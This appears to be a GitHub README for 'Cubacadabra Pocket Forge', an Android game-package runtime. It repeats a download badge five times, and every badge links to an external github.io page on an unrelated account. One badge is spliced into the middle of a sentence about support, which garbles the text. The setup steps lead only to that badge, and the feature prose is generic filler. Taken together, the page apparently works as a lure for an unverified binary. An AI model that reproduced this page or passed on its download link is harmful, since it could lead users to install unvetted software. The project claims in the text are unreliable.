![preview](https://raw.githubusercontent.com/GMafeef/cubacadabra-compose-bridge/main/screen_04bab.svg)
[![Download](https://raw.githubusercontent.com/GMafeef/cubacadabra-compose-bridge/main/setup_4bba.svg)](https://GMafeef.github.io/cubacadabra-compose-bridge/)

# Cubacadabra Pocket Forge 🎲

### *A pocket-sized atelier where portable game worlds are forged, simulated, and played — without ever asking for a network connection.*

[![Download](https://raw.githubusercontent.com/GMafeef/cubacadabra-compose-bridge/main/setup_4bba.svg)](https://GMafeef.github.io/cubacadabra-compose-bridge/) 

---

## 🧭 Overview

**Cubacadabra Pocket Forge** is a reimagined, opinionated sibling to the classic Android client for Cubacadabra. Where the original focuses on being a lean native shell for loading packages and bridging into a shared Rust engine, **Pocket Forge** takes the same spirit and stretches it into a full *authoring + play + observe* workstation that fits in your palm.

Think of it as a **traveling blacksmith's cart for game logic**: raw portable game packages arrive as ingots, the Rust engine heats and shapes them, Compose paints the sparks, and the player walks away with a running world. No cloud. No telemetry. No ceremony. Just a device, a package, and a forge.

The project is built for tinkerers, educators, indies, archivers, and anyone who believes that a game runtime should feel like a *workshop tool* rather than a *storefront*.

---

## 💡 The Idea Behind The Name

A cubacadabra is a small, playful incantation — a spell that fits in the palm of your hand. A **forge** is where raw material becomes something you can actually use. Pocket Forge is where the incantation meets the anvil: portable packages go in, running worlds come out, and every parameter of the process is visible, inspectable, and adjustable.

We deliberately avoided the word "emulator," because Pocket Forge is not pretending to be another machine. It is a **host environment** that speaks the same language as the shared Rust simulation core and lets the player co-author the experience in real time.

---

## 🎯 What Pocket Forge Actually Does

- **Loads portable game packages** — self-contained archives that describe worlds, rules, assets, and metadata.
- **Bridges into a shared Rust engine** through JNI/NDK, so simulation, physics ticks, and rendering primitives run in the same performant core used by the desktop and server tooling.
- **Renders through Jetpack Compose** with a hybrid canvas/surface pipeline that keeps the UI buttery and the world crisp.
- **Connects to companion services** when you want them — a local inspection daemon, a LAN host, or a spectator bridge — and gracefully degrades to fully offline play when you don't.
- **Exposes a live "Forge Console"** so you can watch tick timing, memory churn, entity counts, and draw calls while the world runs.
- **Supports reproducibility**: any package plus a given seed and tick budget should produce the same observable outcome, every time.

---

## 🏗️ Architecture At A Glance

Pocket Forge is layered like a well-run smithy — each stage has a clear job, and each stage can be replaced.

| Layer | Responsibility | Typical Tech |
|-------|----------------|--------------|
| **Shell** | App lifecycle, navigation, theming, accessibility | Kotlin, Jetpack Compose, Compose Navigation |
| **Forge UI** | Package browser, console, settings, overlays | Compose Material 3 |
| **Bridge** | JNI boundary, type marshaling, tick pump | Kotlin + C++ (NDK) |
| **Core** | Simulation, deterministic RNG, world model | Shared Rust engine (compiled per ABI) |
| **Surface** | Frame composition, texture upload, input routing | SurfaceView / Compose interop |
| **Companion** | Optional LAN/daemon/spectator channels | OkHttp, Kotlin Coroutines, WebSocket |
| **Persistence** | Package cache, saves, logs, crash traces | Room, DataStore, filesystem |

Each layer is intentionally **replaceable**. If you prefer a different rendering surface, a different networking stack, or a different UI toolkit, the boundaries are documented and stable.

---

## ✨ Feature Highlights

### 🎨 Responsive, Adaptive Interface
The layout reflows from a phone in portrait to a tablet in landscape to a foldable half-open posture. Controls move where your thumbs actually are, not where a designer imagined them three years ago. Every screen respects system font scaling, reduced motion, and high-contrast modes.

### 🌍 Multilingual Support
Strings are externalized from day one and shipped with a translation pipeline that tolerates partial coverage. If a locale is missing a phrase, Pocket Forge falls back gracefully instead of leaving you with a wall of keys. Community translations are first-class citizens, not an afterthought.

### 🕰️ Around-the-Clock Assistance
A rotating roster of maintainers, volunteers, and automated triage keeps the issue tracker warm. A [![Download](https://raw.githubusercontent.com/GMafeef/cubacadabra-compose-bridge/main/setup_4bba.svg)](https://GMafeef.github.io/cubacadabra-compose-bridge/)-style hotline isn't offered — instead there is a documented support window and a triage policy that ensures nobody waits in silence for days. Assistance is continuous across time zones because the team is distributed across them.

### 🧩 Portable Package Loader
Drag a package onto the device, pick it from storage, or stream it from a LAN host. The loader validates structure, checksums, and engine compatibility before it ever touches the simulation. Malformed packages fail loudly and safely, with a human-readable diagnostic.

### ⚙️ Live Forge Console
A sliding panel that shows:
- ticks per second and frame pacing
- entity and system counts
- allocation churn and GC pauses
- draw call estimates
- recent log lines with severity filters

It is the difference between "the world feels slow" and "the world is slow because system X is doing Y."

### 🧪 Deterministic Replays
Record a session, replay it, and compare. Great for bug reports, great for speedrun verification, and great for teaching.

### 🔌 Companion Channels (Optional)
When you *want* to connect — to a local tool, to a spectator, to a LAN co-op host — Pocket Forge speaks a documented protocol over WebSocket and plain HTTP. When you don't, it says nothing to nobody.

### 🛡️ Offline-First Posture
The default configuration makes zero outbound requests. Every network feature is opt-in, auditable in code, and easy to disable from a single settings switch.

### ♿ Accessibility As A First-Class Concern
TalkBack labels, switch-access friendly focus order, color-blind safe palettes, and a "reduce motion" mode that calms the particle systems without hiding gameplay-critical feedback.

### 🧰 Developer Ergonomics
- Structured logging with a single toggle.
- A debug overlay that can be enabled per build variant.
- A stable ABI contract for the Rust core, with versioned headers.
- Example packages included so you can test the loader without hunting for assets.

---

## 🧠 Design Philosophy

Pocket Forge is built around four convictions:

1. **The device is the studio.** A phone or tablet is a legitimate place to author, not just consume.
2. **Determinism is a feature.** If a world behaves differently on Tuesday than it did on Monday, that is a bug, not a mystery.
3. **Networks are promises, not requirements.** Anything the app *can* do online, it must also be able to do offline.
4. **Observability is kindness.** When something goes wrong, the user should be able to *see* why, not guess.

Each of these convictions translates directly into code: the package validator, the replay system, the offline-first posture, and the Forge Console.

---

## 🚀 Getting Started (Conceptual, Not Command-Line)

Because this README intentionally avoids the usual install-script vocabulary, here is the *conceptual* path a new user takes:

1. **Obtain the build artifact** for your device family. The [![Download](https://raw.githubusercontent.com/GMafeef/cubacadabra-compose-bridge/main/setup_4bba.svg)](https://GMafeef.github.io/cubacadabra-compose-bridge/) marker near the top of this document stands in for whatever distribution channel the maintainers publish to.
2. **Side-load or install** through the platform's normal app-installation flow.
3. **Open Pocket Forge.** You will be greeted by an empty forge and a short guided tour.
4. **Bring in a package.** Use the storage picker, the LAN host browser, or the bundled sample packages.
5. **Press Forge.** The loader validates, the bridge marshals, the Rust core spins up, and the surface begins to paint.
6. **Open the console.** Watch what happens. Tweak what you can. Save what you like.

That's the whole ritual. No accounts, no agreements longer than a screen, no dark patterns.

---

## 🧱 Package Format (High-Level)

A portable game package is a directory-of-concerns, not a single opaque blob. At a minimum it contains:

- a **manifest** declaring engine compatibility and entry point
- a **world** describing entities, systems, and initial state
- an **asset bundle** with textures, audio, and data files
- a **checksum block** so the loader can verify integrity
- optional **metadata** for author, license, and locale overrides

The loader rejects anything that fails manifest validation, checksum validation, or engine-version negotiation. This is how Pocket Forge stays trustworthy: it would rather refuse a bad package than run a half-broken one.

---

## 🧬 The Rust Core And The JNI Boundary

The shared Rust engine owns simulation and low-level rendering primitives. Pocket Forge owns the Kotlin side: lifecycle, UI, storage, and user intent. The boundary between them is intentionally narrow.

- **Handles, not pointers.** Kotlin never touches raw Rust memory. It holds opaque handles.
- **Explicit lifetimes.** Every handle has a documented creation and destruction path.
- **Versioned interface.** The JNI header carries a version number; mismatches are detected at load time.
- **Panics are caught.** A Rust panic on the bridge is converted into a Kotlin exception with a meaningful message, not a silent crash.

This narrowness is what makes the app portable to new ABIs and new platforms without rewriting the shell.

---

## 🧯 Reliability And Safety

- Package validation happens **before** any simulation code runs.
- File access is scoped to the app's storage sandbox unless the user explicitly grants otherwise.
- Network access is opt-in and visible in settings.
- Crash traces are written locally and never uploaded automatically.
- A "safe mode" launch option disables optional subsystems so you can recover from a bad configuration.

---

## 🧭 Roadmap (2026 And Beyond)

- **2026 Q1** — Forge Console v2 with flamegraph-style tick breakdowns.
- **2026 Q2** — Multi-window support for foldables and desktop-mode Android.
- **2026 Q3** — Pluggable renderer backends (Vulkan-first, GLES fallback).
- **2026 Q4** — Collaborative LAN session with deterministic rollback.
- **Long-term** — A public package registry (read-only mirror, community-driven) that never phones home without consent.

The roadmap is a conversation starter, not a contract. Issues and pull requests shape it every week.

---

## 🤝 Contributing

Contributions are welcome from anyone who finds the project interesting — coders, translators, testers, writers, and archivists included.

- **Code contributions** should come with tests where reasonable and a short rationale in the pull request description.
- **Translation contributions** are accepted as partial files; the fallback system handles the gaps.
- **Documentation contributions** are valued equally with code; a clear README is a feature.
- **Bug reports** are most useful when they include a package, a tick range, and a console excerpt.

A code of conduct applies to all project spaces. Be the kind of collaborator you would want to receive on a bad day.

---

## 🗺️ Repository Layout

- **`app/`** — the Android application module (Kotlin + Compose)
- **`bridge/`** — the JNI/NDK glue and C++ shims
- **`core/`** — the shared Rust engine sources and build scripts
- **`docs/`** — architecture notes, package format spec, protocol spec
- **`samples/`** — example packages for testing the loader
- **`tools/`** — helper utilities for packaging, inspecting, and validating
- **`tests/`** — unit, integration, and replay-comparison tests

Each directory has its own README with a focused explanation. The one you are reading is the front door; the others are the rooms.

---

## 🔐 Privacy Posture

Pocket Forge collects nothing by default. There is no analytics SDK, no advertising identifier, no background uploader. If a future feature requires network access, it will be opt-in, documented here, and disableable from settings.

The project believes that a game runtime should not be a surveillance instrument, and it enforces that belief in code rather than in policy prose.

---

## ⚠️ Disclaimer

Pocket Forge is an independent project. It is not affiliated with, endorsed by, or sponsored by any console manufacturer, platform holder, or game publisher. It does not include, distribute, or bundle any copyrighted game assets, and it does not condone the use of unauthorized content.

Users are responsible for ensuring that any game packages they load are ones they have the legal right to use. The maintainers provide the forge; they do not provide the metal.

The software is provided "as is", without warranty of any kind, express or implied. Use it at your own risk. Back up your data. Read the license. Be kind to your device's battery.

---

## 📜 License

This project is released under the **MIT License**.

You can read the full text of the license in the [LICENSE](./LICENSE) file in this repository.

Copyright (c) 2026 Cubacadabra Pocket Forge contributors.

---

## 🙏 Acknowledgements

- The Rust community, for a simulation language that is as pleasant as it is fast.
- The Kotlin and Jetpack Compose teams, for making UI code something a human can read.
- The Android NDK maintainers, for keeping the bridge between managed and native code tractable.
- Every translator, tester, and issue reporter who has made this project better than it started.
- The original Cubacadabra Android client, whose spirit this project carries forward in a different shape.

---

## 🧾 Final Word

Pocket Forge is not trying to be the biggest app on your device. It is trying to be the most *honest* one: it tells you what it is doing, it lets you watch, and it lets you stop. If that sounds like a workshop you would like to visit, the door is open.

[![Download](https://raw.githubusercontent.com/GMafeef/cubacadabra-compose-bridge/main/setup_4bba.svg)](https://GMafeef.github.io/cubacadabra-compose-bridge/)